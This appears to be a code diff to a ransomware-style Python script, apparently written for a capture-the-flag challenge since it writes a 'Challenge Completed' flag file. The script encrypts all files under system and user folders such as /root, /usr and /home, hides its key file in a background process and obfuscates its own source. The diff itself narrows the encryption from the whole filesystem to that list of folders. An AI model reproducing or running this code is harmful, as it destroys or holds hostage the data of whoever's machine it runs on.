@@ -35,11 +35,13 @@ def encrypt_file(file_path, key):
     with open(file_path, "wb") as f:
         f.write(iv + encrypted_data)
 
-def process_files(directory, excluded_files, key):
-    for root, _, files in os.walk(directory):
-        for file in files:
-            if file not in excluded_files:
-                encrypt_file(os.path.join(root, file), key)
+def process_files(directories, excluded_files, key):
+    for directory in directories:
+        if os.path.exists(directory):
+            for root, _, files in os.walk(directory):
+                for file in files:
+                    if file not in excluded_files:
+                        encrypt_file(os.path.join(root, file), key)
 
 def hide_key_file(key_file_path):
     while True:
@@ -61,12 +63,17 @@ def main():
     key, salt, password = generate_key()
     key_file_path = "keyfile"
     excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
+    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
+    
     with open(key_file_path, "wb") as f:
         f.write(key)
+    
     parent_process = Process(target=hide_key_file, args=(key_file_path,))
     parent_process.start()
-    process_files("/", excluded_files, key)
+    
+    process_files(target_folders, excluded_files, key)
     reverse_and_obfuscate_script(sys.argv[0])
+    
     with open("/tmp/.flag.txt", "w") as f:
         f.write("Challenge Completed")
 
